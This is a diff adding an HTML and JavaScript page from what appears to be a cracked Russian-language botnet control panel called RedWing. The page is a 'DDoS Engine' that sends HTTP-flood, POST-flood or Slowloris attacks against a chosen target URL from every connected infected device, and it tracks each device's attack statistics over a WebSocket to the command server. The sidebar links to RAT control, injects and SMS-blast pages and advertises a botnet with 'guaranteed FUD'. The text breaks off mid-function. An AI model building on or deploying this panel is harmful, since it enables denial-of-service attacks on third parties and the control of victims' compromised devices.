@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RedWing — DDoS Engine</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/feather-icons"></script>
+    <script src="/theme.js?v=2"></script>
+    <style>
+        :root {
+            --bg-dark: #080809;
+            --bg-surface: #0b0b0e;
+            --bg-card: #0f0f12;
+            --bg-card-hover: #151518;
+            --border-color: #1a1a1f;
+            --red-primary: #dc3545;
+            --red-dark: #a71d2a;
+            --red-glow: rgba(220, 53, 69, 0.25);
+            --text-white: #e8e8e8;
+            --text-secondary: #a0a0a8;
+            --text-gray: #707078;
+            --text-dim: #404048;
+            --accent-green: #20c997;
+            --accent-yellow: #ffc107;
+            --accent-blue: #4dabf7;
+            --accent-orange: #fd7e14;
+            --accent-purple: #9775fa;
+            --scrollbar-thumb: #1a1a1f;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Exo 2', sans-serif; background: var(--bg-dark); color: var(--text-white); min-height: 100vh; display: flex; }
+        .sidebar { width: var(--sidebar-width, 260px); background: var(--sidebar-bg, #0b0b0e); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; position: fixed; top: 0; left: 0; bottom: 0; z-index: 100; }
+        .sidebar-logo { padding: 20px 16px 16px; border-bottom: 1px solid var(--border-color); text-align: center; }
+        .logo-name { font-size: 1.2rem; font-weight: 700; color: var(--red-primary); letter-spacing: 4px; text-transform: uppercase; }
+        .logo-subtitle { font-size: 0.6rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 2px; margin-top: 2px; }
+        .sidebar-nav { flex: 1; padding: 20px 12px; overflow-y: auto; }
+        .nav-section { margin-bottom: 24px; }
+        .nav-section-title { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 2px; color: var(--text-dim); padding: 0 12px; margin-bottom: 8px; }
+        .nav-item { display: flex; align-items: center; gap: 10px; padding: 10px 12px; border-radius: 6px; color: var(--text-gray); text-decoration: none; font-size: 0.9rem; font-weight: 500; transition: all .2s; margin-bottom: 2px; }
+        .nav-item:hover { background: rgba(255,255,255,.04); color: var(--text-white); }
+        .nav-item.active { background: var(--red-primary); color: #fff; }
+        .nav-item-icon { width: 20px; height: 20px; }
+        .nav-item-text { font-size: 0.9rem; }
+        .sidebar-user { padding: 16px 20px; border-top: 1px solid var(--border-color); display: flex; align-items: center; gap: 10px; }
+        .user-avatar { width: 36px; height: 36px; border-radius: 6px; background: var(--red-dark); display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 600; }
+        .user-info { flex: 1; }
+        .user-name { font-size: 0.9rem; font-weight: 600; }
+        .user-role { font-size: 0.7rem; color: var(--text-dim); }
+        .main { margin-left: var(--sidebar-width, 260px); flex: 1; padding: 24px; min-height: 100vh; }
+        .page-header { margin-bottom: 24px; }
+        .page-title { font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
+        .page-title svg { color: var(--red-primary); }
+        .page-desc { font-size: 13px; color: var(--text-gray); margin-top: 4px; }
+        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
+        .card-title { font-size: 14px; font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .form-row { display: flex; gap: 12px; margin-bottom: 12px; }
+        .form-group { flex: 1; }
+        .form-label { font-size: 11px; color: var(--text-gray); margin-bottom: 4px; display: block; }
+        .form-input, .form-select { width: 100%; padding: 8px 12px; background: rgba(0,0,0,.3); border: 1px solid var(--border-color); border-radius: 8px; color: var(--text-white); font-size: 13px; font-family: 'Exo 2', sans-serif; }
+        .form-select { cursor: pointer; }
+        .btn { padding: 10px 20px; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; font-family: 'Exo 2', sans-serif; transition: all .2s; }
+        .btn-danger { background: rgba(244,67,54,.25); border: 1px solid rgba(244,67,54,.5); color: #f44336; }
+        .btn-danger:hover { background: rgba(244,67,54,.4); }
+        .btn-stop { background: rgba(255,255,255,.06); border: 1px solid var(--border-color); color: var(--text-secondary); }
+        .btn-stop:hover { background: rgba(255,255,255,.1); }
+        .btn-group { display: flex; gap: 8px; margin-top: 16px; }
+        .status-badge { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; }
+        .status-idle { background: rgba(255,255,255,.06); color: var(--text-gray); }
+        .status-running { background: rgba(244,67,54,.2); color: #f44336; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; margin-top: 12px; }
+        .stat-card { background: rgba(0,0,0,.2); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; text-align: center; }
+        .stat-value { font-size: 22px; font-weight: 700; font-family: 'JetBrains Mono', monospace; }
+        .stat-label { font-size: 10px; color: var(--text-gray); text-transform: uppercase; margin-top: 4px; }
+        .device-table { width: 100%; border-collapse: collapse; margin-top: 12px; }
+        .device-table th, .device-table td { padding: 8px 12px; text-align: left; font-size: 12px; border-bottom: 1px solid var(--border-color); }
+        .device-table th { color: var(--text-gray); font-weight: 500; font-size: 11px; text-transform: uppercase; }
+        .device-table td { font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+        .dot-online { display: inline-block; width: 6px; height: 6px; border-radius: 50%; background: var(--accent-green); margin-right: 6px; }
+        #connectionStatus { font-size: 12px; color: var(--text-gray); display: flex; align-items: center; gap: 6px; margin-top: 8px; }
+        #connectionStatus .dot { width: 8px; height: 8px; border-radius: 50%; }
+        @media (max-width: 768px) {
+            .sidebar { display: none; }
+            .main { margin-left: 0; }
+        }
+    </style>
+    <link rel="stylesheet" href="/sidebar.css?v=6">
+<script src="/guard.js"></script></head>
+<body>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
+
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-logo">
+            <div class="logo-fog"></div>
+            <div class="logo-glow"></div>
+            <canvas class="logo-particles" id="logoParticles"></canvas>
+            <div class="logo-wrapper">
+                <div class="logo-svg-container">
+                    <svg viewBox="0 0 1024 687" xmlns="http://www.w3.org/2000/svg">
+                        <g class="wing-left">
+                            <path fill="var(--red-primary)" d="M281 557.4 c0 -0.4 1.5 -3.7 16 -34.4 16.5 -34.9 23 -48.6 24.2 -50.9 1 -1.9 8 -5 35.3 -15.8 18.7 -7.4 36.8 -14.6 40.3 -16.1 5.9 -2.5 7.8 -4.2 4.8 -4.2 -1.2 0 -27.7 -7.8 -32.6 -9.6 -1.5 -0.6 2.7 -2.1 34.9 -11.8 10.2 -3.1 18.6 -5.8 18.8 -6 0.2 -0.2 -2.5 -4.8 -5.9 -10.2 -3.5 -5.5 -6.7 -10.4 -7.1 -11 -0.6 -1.1 4.5 -0.1 24.8 4.6 20.5 4.7 18.2 4.6 30.9 1.8 l11.6 -2.5 1.1 4.1 c2.8 10.9 5.2 17.2 7.1 19.3 l2.1 2.2 -5.5 6.8 c-14.2 17.7 -16.5 24.6 -12.8 38.7 1.1 4.4 1.9 8.1 1.7 8.2 -0.4 0.4 -15.7 7.5 -44.7 20.8 -14 6.5 -27.8 12.8 -30.6 14.2 -5.6 2.7 -37.7 17.3 -52.4 23.9 -5.2 2.3 -12.9 5.8 -17 7.8 -19.5 9.2 -45 20.6 -45 20.1z"/>
+                        </g>
+                        <path fill="var(--bg-card)" stroke="var(--red-primary)" stroke-width="2" stroke-opacity="0.3" d="M501.4 539.4 c-0.7 -10.1 -1.4 -14.8 -2.3 -15.3 -0.7 -0.5 -4.6 -1.4 -8.7 -2.1 -4.1 -0.7 -7.4 -1.6 -7.4 -1.9 0 -0.3 3.9 -1.5 8.8 -2.6 l8.7 -2 1.2 -17 c0.6 -9.4 1.9 -27.1 2.8 -39.5 1.6 -20.9 1.6 -22.8 0.1 -25.7 -0.9 -1.8 -1.6 -4.6 -1.6 -6.2 0 -2 -1 -4.1 -3.2 -6.3 -11.5 -11.8 -11.7 -12.1 -14.2 -21.1 l-2.4 -8.7 6.4 -4.6 6.4 -4.6 0 -18.3 0 -18.3 -5.7 -5.6 -5.8 -5.6 -7.7 0 c-6.4 0 -7.7 -0.3 -8.1 -1.7 -0.3 -1 -1.3 -4.9 -2.2 -8.8 -1.5 -6.5 -2 -7.3 -7.5 -12 -3.2 -2.7 -5.9 -5.5 -5.9 -6.2 -0.1 -1.8 6 -17.6 7.4 -19.1 0.6 -0.7 3.3 -1.5 6 -1.6 3.8 -0.3 5.2 -0.9 7.1 -3.2 1.3 -1.6 2.3 -3.4 2.4 -4 0 -0.6 -5.5 -2.7 -12.2 -4.8 -6.7 -2 -13.1 -4.4 -14.2 -5.4 -1.2 -1 -4.1 -3.1 -6.6 -4.8 -13.8 -9.5 -32.1 -22 -36.3 -24.7 -4.5 -3 -5.4 -4.4 -14.9 -23.2 -5.5 -11 -10.4 -20.4 -10.9 -21 -4 -4.3 4.9 -3.3 15.1 1.7 8.2 4 16.8 12.5 20.9 20.6 1.7 3.4 3.3 6.2 3.5 6.2 1.1 0 -1.9 -9.4 -5 -15.9 -4.2 -8.6 -13.2 -18.1 -21 -22.3 -20.7 -11.1 -47.2 -5.6 -60.9 12.7 -4.9 6.5 -7.3 12.3 -9.1 21.5 -5.7 29 15.6 60 46.2 67.4 l5.9 1.4 -4.5 0.1 c-11.4 0.2 -26.9 -5.5 -37.5 -13.6 -13.2 -10.2 -23.7 -26.5 -27 -41.9 -1.9 -9 -1.9 -21.5 0 -28.9 6.4 -24.5 24.1 -41 49.4 -45.9 3.6 -0.7 5.9 -1.5 5.1 -1.8 -0.8 -0.4 -18.1 -4.3 -38.5 -8.7 -20.3 -4.5 -38.3 -8.5 -40 -9 -1.8 -0.6 36.2 -1 96.9 -1 l99.8 -0.1 5.3 -4.9 c6.3 -5.7 12.5 -8.8 21.4 -10.7 8.4 -1.7 12.1 -1.7 19.9 0.1 8.4 2 15.9 5.8 22 11.1 l5 4.4 86.6 0 c47.6 0 86.6 0.2 86.6 0.5 0 0.3 -3.9 8.8 -8.6 18.9 l-8.6 18.4 -8.7 1.2 c-4.7 0.6 -10.8 1.4 -13.5 1.8 l-4.9 0.7 -13.3 28.3 c-7.2 15.5 -14.1 30.5 -15.3 33.2 l-2.2 5 -16.4 0 c-11.9 0 -16.7 0.3 -17.5 1.3 -0.6 0.6 -4 6.6 -7.4 13.2 l-6.3 12 -22 8.8 -22 8.8 -1.7 6 c-0.9 3.3 -1.4 6.4 -1.1 6.9 0.3 0.5 2.8 2.2 5.5 3.7 2.8 1.5 5 3.2 5 3.7 0 0.5 -1.9 3 -4.2 5.6 -9.6 10.5 -20.8 23.9 -20.8 24.9 0 0.6 3.9 7.4 8.6 15.2 l8.6 14.1 -3.9 9.1 c-4.2 9.9 -4 9.8 -11.7 8.3 l-3.8 -0.7 0.4 6.6 0.4 6.6 -5.3 5 -5.3 5 -4.6 -3.7 c-5.4 -4.5 -6.4 -6.1 -6.4 -10.8 0 -3.3 -1.2 -4.7 -2.4 -2.8 -0.2 0.4 -1 7.3 -1.6 15.2 -0.8 10.3 -0.8 14.6 -0.1 14.8 1.7 0.6 1.3 10.3 -0.4 12.2 -1.1 1.2 -1.8 6.2 -2.5 19.6 -0.6 9.8 -1.7 28 -2.5 40.3 -0.9 12.3 -1.3 22.7 -0.9 23 0.3 0.3 4.6 1.8 9.6 3.2 l9.1 2.6 -7.9 1.2 c-13.4 2.1 -11.9 0.4 -14.9 16.4 -1.5 7.8 -2.8 14.3 -3 14.5 -0.1 0.1 -0.6 -6.3 -1.1 -14.4z m13.9 -191 c4.4 -2.3 4.7 -3 4.7 -10.4 0 -5.9 1.8 -33 5.4 -82.3 1.4 -18.4 1.4 -19 -0.6 -23.5 l-2 -4.7 -2.3 4.6 c-2 3.9 -2.5 7 -3.4 22 -0.6 9.5 -1.8 27.3 -2.6 39.4 -4 60.6 -3.8 56.5 -3 56.5 0.4 0 2 -0.7 3.8 -1.6z m31.5 -150.2 c8.5 -8.6 13.2 -23.1 11.3 -35.1 -1.9 -12 -10.5 -24.2 -20.3 -28.9 -8.1 -4 -16.3 -5.5 -23 -4.3 -19.1 3.3 -31.8 17.2 -32.7 35.5 -0.3 7.5 1.2 18 2.7 19 0.4 0.2 0.7 -3.5 0.7 -8.2 0.1 -7.4 0.5 -9.5 2.7 -13.8 6 -11.4 16.2 -17.8 28.8 -17.8 6.1 0.1 8.6 0.6 13.2 2.8 20.4 9.7 25.4 38.4 9.5 53.9 l-5.1 4.9 4.3 -2.1 c2.3 -1.2 5.9 -3.9 7.9 -5.9z"/>
+                        <g class="wing-right">
+                            <path fill="var(--red-primary)" d="M756 483.5 c-4.7 -1.3 -20.2 -5.5 -34.5 -9.3 -58.3 -15.7 -97.5 -26.3 -106 -28.7 -4.9 -1.3 -13 -3.5 -18 -4.8 -8.3 -2.3 -9 -2.6 -8.7 -4.8 0.1 -1.3 0.3 -5.3 0.5 -8.9 0.1 -5.7 -0.2 -7.3 -3.3 -12.9 -2.3 -4.2 -5.6 -8.2 -9.9 -12 -3.6 -3.1 -8.9 -7.8 -11.7 -10.4 l-5.2 -4.8 4.1 -9.1 4.1 -9.1 -2.6 -4.7 -2.7 -4.8 10.7 -0.4 10.7 -0.4 8.5 -5.4 c14.8 -9.4 20.2 -12.2 19.6 -10.2 -2.2 7.4 -5.1 23.2 -4.2 23.2 0.9 0 45.8 5.7 52.5 6.7 l5.4 0.8 -15.1 7.9 c-8.4 4.4 -15.2 8.2 -15.2 8.6 0 0.3 10.2 2.9 22.8 5.9 12.5 2.9 30 7 38.9 9.2 9 2.1 16.8 3.9 17.5 3.9 0.7 0 9.9 12.7 20.3 28.2 27 40 32.6 48.8 31.2 48.7 -0.6 -0.1 -5 -1.2 -9.7 -2.4z"/>
+                        </g>
+                    </svg>
+                </div>
+                <div class="logo-separator"></div>
+                <div class="logo-text">
+                    <div class="logo-name">RedWing</div>
+                    <div class="logo-subtitle">Control Panel</div>
+                </div>
+            </div>
+        </div>
+
+        <nav class="sidebar-nav">
+            <div class="nav-section">
+                <div class="nav-section-title" data-i18n="nav_main">Основное</div>
+                <a href="dashboard.html" class="nav-item">
+                    <i data-feather="bar-chart-2" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_dashboard">Дашборд</span>
+                </a>
+                <a href="devices.html" class="nav-item">
+                    <i data-feather="smartphone" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_devices">Устройства</span>
+                </a>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-section-title" data-i18n="nav_management">Управление</div>
+                <a href="vnc.html" class="nav-item" id="rat-nav-item">
+                    <i data-feather="monitor" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_rat">RAT Управление</span>
+                </a>
+                <a href="injects.html" class="nav-item">
+                    <i data-feather="crosshair" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_injects">Инжекты</span>
+                </a>
+                <a href="blast.html" class="nav-item">
+                    <i data-feather="send" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_blast">SMS Рассылка</span>
+                </a>
+                <a href="ddos.html" class="nav-item active">
+                    <i data-feather="zap" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_ddos">DDoS</span>
+                </a>
+            </div>
+
+            <div class="nav-section" id="nav-section-settings">
+                <div class="nav-section-title" data-i18n="nav_settings_section">Настройки</div>
+                <a href="workers.html" class="nav-item" id="workers-nav-item">
+                    <i data-feather="users" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_workers">Вбиверы</span>
+                </a>
+                <a href="settings.html" class="nav-item" id="settings-nav-item">
+                    <i data-feather="settings" class="nav-item-icon"></i>
+                    <span class="nav-item-text" data-i18n="nav_settings">Настройки</span>
+                </a>
+            </div>
+        </nav>
+
+        <div class="sidebar-credits" style="border-top:1px solid rgba(220,38,38,.15);padding:14px 16px;">
+            <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#ef4444;font-weight:700;margin-bottom:6px;">CRACKED BY OMNI</div>
+            <div data-i18n="crack_sidebar" style="font-size:11px;color:rgba(255,255,255,.4);line-height:1.5;margin-bottom:8px;">Кроссплатформенный ботнет<br>с гарантией FUD</div>
+            <a href="https://omni.lc/" target="_blank" style="display:block;padding:6px 12px;background:#ef4444;border-radius:8px;color:#fff;font-size:11px;font-weight:600;text-align:center;text-decoration:none;margin-bottom:6px;">omni.lc</a>
+            <a href="https://t.me/omnibotnet" target="_blank" style="display:block;font-size:11px;color:rgba(255,255,255,.35);text-align:center;text-decoration:none;">Telegram: @omnibotnet</a>
+        </div>
+
+        <div class="sidebar-user">
+            <div class="user-avatar" id="userAvatar">R</div>
+            <div class="user-info">
+                <div class="user-name" id="userName">RedWing</div>
+                <div class="user-role" id="userRole">DDoS Engine</div>
+            </div>
+            <div class="user-logout" data-i18n-title="logout" title="Выйти" onclick="logout()"><i data-feather="log-out"></i></div>
+        </div>
+    </aside>
+
+    <div class="main">
+        <div class="page-header">
+            <div style="display:flex;align-items:center;gap:12px;">
+                <button class="mobile-menu-btn" onclick="toggleSidebar()" style="margin-right:12px;"><i data-feather="menu"></i></button>
+                <div class="page-title"><i data-feather="zap"></i> <span data-i18n="page_ddos_engine">DDoS Engine</span></div>
+                <button id="langToggleBtn" onclick="toggleLang()" style="background:var(--bg-card);border:1px solid var(--border-color);color:var(--text-secondary);padding:4px 10px;border-radius:6px;cursor:pointer;font-size:.8rem;font-weight:600;margin-left:12px;">RU</button>
+            </div>
+            <div class="page-desc" data-i18n="page_ddos_desc">Запуск атаки на все подключённые устройства одновременно</div>
+            <div id="connectionStatus"><div class="dot" style="background:#666;"></div> <span data-i18n="connecting">Подключение...</span></div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i data-feather="settings" style="width:16px;height:16px;"></i> <span data-i18n="card_attack_params">Параметры атаки</span></div>
+            <div class="form-row">
+                <div class="form-group" style="flex:2;">
+                    <label class="form-label" data-i18n="label_target_url">URL цели</label>
+                    <input id="ddosUrl" type="text" class="form-input" placeholder="https://target.com">
+                </div>
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_attack_type">Тип атаки</label>
+                    <select id="ddosType" class="form-select">
+                        <option value="HTTP_FLOOD">HTTP Flood (GET)</option>
+                        <option value="POST_FLOOD">POST Flood</option>
+                        <option value="SLOWLORIS">Slowloris</option>
+                    </select>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_port">Порт</label>
+                    <input id="ddosPort" type="number" class="form-input" value="80">
+                </div>
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_threads">Потоки (на устройство)</label>
+                    <input id="ddosThreads" type="number" class="form-input" value="10" min="1" max="50">
+                </div>
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_duration">Длительность (сек)</label>
+                    <input id="ddosDuration" type="number" class="form-input" value="60" min="1" max="3600">
+                </div>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-danger" id="btnStart" onclick="startBroadcastDdos()"><i data-feather="zap" style="width:16px;height:16px;"></i> <span data-i18n="btn_start_all">Запустить на ВСЕХ</span></button>
+                <button class="btn btn-stop" id="btnStop" onclick="stopBroadcastDdos()"><i data-feather="square" style="width:16px;height:16px;"></i> <span data-i18n="btn_stop_all">Остановить всех</span></button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title" style="justify-content:space-between;">
+                <span><i data-feather="activity" style="width:16px;height:16px;"></i> <span data-i18n="card_status">Статус</span></span>
+                <span id="attackBadge" class="status-badge status-idle" data-i18n="status_stop">СТОП</span>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="statDevices" style="color:var(--accent-green);">0</div>
+                    <div class="stat-label" data-i18n="stat_devices_attacking">Устройств атакует</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="statRequests" style="color:#4fc3f7;">0</div>
+                    <div class="stat-label" data-i18n="stat_total_requests">Запросов всего</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="statConnections" style="color:#ffd54f;">0</div>
+                    <div class="stat-label" data-i18n="stat_active_connections">Активных соединений</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="statErrors" style="color:#f44336;">0</div>
+                    <div class="stat-label" data-i18n="stat_errors">Ошибок</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i data-feather="smartphone" style="width:16px;height:16px;"></i> <span data-i18n="card_devices">Устройства</span></div>
+            <table class="device-table">
+                <thead><tr>
+                    <th data-i18n="th_device">Устройство</th>
+                    <th data-i18n="th_status">Статус</th>
+                    <th data-i18n="th_requests">Запросов</th>
+                    <th data-i18n="th_connections">Соединений</th>
+                    <th data-i18n="th_errors">Ошибок</th>
+                </tr></thead>
+                <tbody id="deviceTableBody"><tr><td colspan="5" style="text-align:center;color:var(--text-gray);" data-i18n="no_connected_devices">Нет подключённых устройств</td></tr></tbody>
+            </table>
+        </div>
+    </div>
+
+<script>
+    let LANG = localStorage.getItem('rw_panel_lang') || 'ru';
+    const I18N = {
+        ru: {
+            nav_main: 'Основное',
+            nav_dashboard: 'Дашборд',
+            nav_devices: 'Устройства',
+            nav_management: 'Управление',
+            nav_rat: 'RAT Управление',
+            nav_injects: 'Инжекты',
+            nav_blast: 'SMS Рассылка',
+            nav_ddos: 'DDoS',
+            nav_settings_section: 'Настройки',
+            nav_workers: 'Вбиверы',
+            nav_settings: 'Настройки',
+            sidebar_credits: 'Актуальные данные',
+            logout: 'Выйти',
+            role_ts: 'ТС • Полный доступ',
+            role_worker: 'Вбивер',
+            page_ddos_engine: 'DDoS Engine',
+            page_ddos_desc: 'Запуск атаки на все подключённые устройства одновременно',
+            connecting: 'Подключение...',
+            connected_vnc: 'Подключено к VNC',
+            reconnecting: 'Переподключение...',
+            card_attack_params: 'Параметры атаки',
+            label_target_url: 'URL цели',
+            label_attack_type: 'Тип атаки',
+            label_port: 'Порт',
+            label_threads: 'Потоки (на устройство)',
+            label_duration: 'Длительность (сек)',
+            btn_start_all: 'Запустить на ВСЕХ',
+            btn_stop_all: 'Остановить всех',
+            card_status: 'Статус',
+            status_stop: 'СТОП',
+            status_attack: 'АТАКА',
+            status_devices_suffix: 'устройств',
+            stat_devices_attacking: 'Устройств атакует',
+            stat_total_requests: 'Запросов всего',
+            stat_active_connections: 'Активных соединений',
+            stat_errors: 'Ошибок',
+            card_devices: 'Устройства',
+            th_device: 'Устройство',
+            th_status: 'Статус',
+            th_requests: 'Запросов',
+            th_connections: 'Соединений',
+            th_errors: 'Ошибок',
+            no_connected_devices: 'Нет подключённых устройств',
+            device_attacking: 'Атакует',
+            device_reconnect: 'Реконнект',
+            device_waiting: 'Ожидание',
+            alert_enter_url: 'Введите URL цели',
+            crack_sidebar: 'Кроссплатформенный ботнет<br>с гарантией FUD',
+        },
+        en: {
+            nav_main: 'Main',
+            nav_dashboard: 'Dashboard',
+            nav_devices: 'Devices',
+            nav_management: 'Management',
+            nav_rat: 'RAT Control',
+            nav_injects: 'Injects',
+            nav_blast: 'SMS Blast',
+            nav_ddos: 'DDoS',
+            nav_settings_section: 'Settings',
+            nav_workers: 'Workers',
+            nav_settings: 'Settings',
+            sidebar_credits: 'Contacts',
+            logout: 'Logout',
+            role_ts: 'TS • Full Access',
+            role_worker: 'Worker',
+            page_ddos_engine: 'DDoS Engine',
+            page_ddos_desc: 'Launch attack on all connected devices simultaneously',
+            connecting: 'Connecting...',
+            connected_vnc: 'Connected to VNC',
+            reconnecting: 'Reconnecting...',
+            card_attack_params: 'Attack Parameters',
+            label_target_url: 'Target URL',
+            label_attack_type: 'Attack Type',
+            label_port: 'Port',
+            label_threads: 'Threads (per device)',
+            label_duration: 'Duration (sec)',
+            btn_start_all: 'Launch on ALL',
+            btn_stop_all: 'Stop all',
+            card_status: 'Status',
+            status_stop: 'STOP',
+            status_attack: 'ATTACK',
+            status_devices_suffix: 'devices',
+            stat_devices_attacking: 'Devices attacking',
+            stat_total_requests: 'Total requests',
+            stat_active_connections: 'Active connections',
+            stat_errors: 'Errors',
+            card_devices: 'Devices',
+            th_device: 'Device',
+            th_status: 'Status',
+            th_requests: 'Requests',
+            th_connections: 'Connections',
+            th_errors: 'Errors',
+            no_connected_devices: 'No connected devices',
+            device_attacking: 'Attacking',
+            device_reconnect: 'Reconnecting',
+            device_waiting: 'Waiting',
+            alert_enter_url: 'Enter target URL',
+            crack_sidebar: 'Cross-platform botnet<br>with guaranteed FUD',
+        }
+    };
+    function L(k) { return (I18N[LANG] || I18N.ru)[k] || k; }
+    function applyI18n() {
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const k = el.getAttribute('data-i18n');
+            const v = L(k);
+            if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') el.placeholder = v;
+            else el.innerHTML = v;
+        });
+        document.querySelectorAll('[data-i18n-title]').forEach(el => {
+            el.title = L(el.getAttribute('data-i18n-title'));
+        });
+    }
+    function toggleLang() {
+        LANG = LANG === 'ru' ? 'en' : 'ru';
+        localStorage.setItem('rw_panel_lang', LANG);
+        applyI18n();
+        document.getElementById('langToggleBtn').textContent = LANG.toUpperCase();
+        updateRoleText();
+        renderDeviceTable();
+        if (!isRunning) {
+            document.getElementById('attackBadge').textContent = L('status_stop');
+        }
+    }
+
+    const VNC_WS_URL = `wss://${window.location.host}/vnc-ws`;
+    let ws = null;
+    let isRunning = false;
+    const deviceStats = {};
+    const DEVICE_GRACE_MS = 30000;
+
+    setInterval(() => {
+        const now = Date.now();
+        let changed = false;
+        for (const id in deviceStats) {
+            const d = deviceStats[id];
+            if (d._offline && !d.running && (now - d._offlineSince) > DEVICE_GRACE_MS) {
+                delete deviceStats[id];
+                changed = true;
+            }
+        }
+        if (changed) { renderDeviceTable(); updateAggregatedStats(); }
+    }, 5000);
+
+    const teamId = localStorage.getItem('panel_team_id') || '';
+
+    async function getVncToken() {
+        try {
+            const session = JSON.parse(localStorage.getItem('panel_session') || '{}');
+            const resp = await fetch(`${window.location.origin}/api/vnc-token`, {
+                headers: { 'X-Team-ID': teamId, 'X-Session-Token': session.token || '', 'X-Login': session.login || '' }
+            });
+            if (resp.ok) return await resp.json();
+        } catch(_) {}
+        return {};
+    }
+
+    async function connectWs() {
+        const token = await getVncToken();
+        ws = new WebSocket(VNC_WS_URL);
+        ws.onopen = () => {
+            ws.send(JSON.stringify({
+                type: 'register_panel',
+                panel_id: token.panel_id || ('ddos_' + Date.now()),
+                token: token.token || '',
+                timestamp: token.timestamp || 0,
+                team_id: teamId
+            }));
+            setConnectionStatus(true);
+        };
+        ws.onmessage = (e) => {
+            try { handleMessage(JSON.parse(e.data)); } catch(_) {}
+        };
+        ws.onclose = () => {
+            setConnectionStatus(false);
+            setTimeout(connectWs, 3000);
+        };
+        ws.onerror = () => {};
+    }
+
+    function setConnectionStatus(connected) {
+        const el = document.getElementById('connectionStatus');
+        if (connected) {
+            el.innerHTML = `<div class="dot" style="background:var(--accent-green);"></div> ${L('connected_vnc')}`;
+        } else {
+            el.innerHTML = `<div class="dot" style="background:#666;"></div> ${L('reconnecting')}`;
+        }
+    }
+
+    function handleMessage(data) {
+        switch (data.type) {
+            case 'device_list':
+                if (data.devices) {
+                    data.devices.forEach(d => {
+                        if (!deviceStats[d.device_id]) {
+                            deviceStats[d.device_id] = { model: d.model || d.device_id.substring(0,8), running: false, requests: 0, connections: 0, errors: 0 };
+                        }
+                    });
+                    renderDeviceTable();
+                }
+                break;
+            case 'device_connected':
+                if (data.device_id) {
+                    if (!deviceStats[data.device_id]) {
+                        deviceStats[data.device_id] = { model: data.model || data.device_id.substring(0,8), running: false, requests: 0, connections: 0, errors: 0 };
+                    } else {
+                        deviceStats[data.device_id]._offline = false;
+                        delete deviceStats[data.device_id]._offlineSince;
+                    }
+                    renderDeviceTable();
+                }
+                break;
+            case 'device_disconnected':
+                if (data.device_id && deviceStats[data.device_id]) {
+                    const ds = deviceStats[data.device_id];
+                    if (ds.running) {
+                        ds._offlineSince = Date.now();
+                        ds._offline = true;
+                        renderDeviceTable();
+                    } else {
+                        ds._offlineSince = Date.now();
+                        ds._offline = true;
+                        renderDeviceTable();
+                    }
+                    updateAggregatedStats();
+                }
+                break;
+            case 'ddos_broadcast_ack':
+                isRunning = true;
+                document.getElementById('attackBadge').className = 'status-badge status-running';
+                document.getElementById('attackBadge').textContent = `${L('status_attack')} — ${data.devices_targeted}/${data.total_devices} ${L('status_devices_suffix')}`;
+                document.getElementById('statDevices').textContent = data.devices_targeted;
+                break;
+            case 'ddos_broadcast_stopped':
+                isRunning = false;
+                document.getElementById('attackBadge').className = 'status-badge status-idle';
+                document.getElementById('attackBadge').textContent = L('status_stop');
+                break;
+            case 'ddos_started':
+                if (data.device_id && deviceStats[data.device_id]) {
+                    deviceStats[data.device_id].running = true;
+                    renderDeviceTable();
+                }
+                break;
+            case 'ddos_stopped':
+                if (data.device_id && deviceStats[data.device_id]) {
+                    deviceStats[data.device_id].running = false;
+                    renderDeviceTable();
+                    updateAggregatedStats();
+                }
+                break;
+            case 'ddos_stats':
+                if (data.device_id && deviceStats[data.device_id]) {
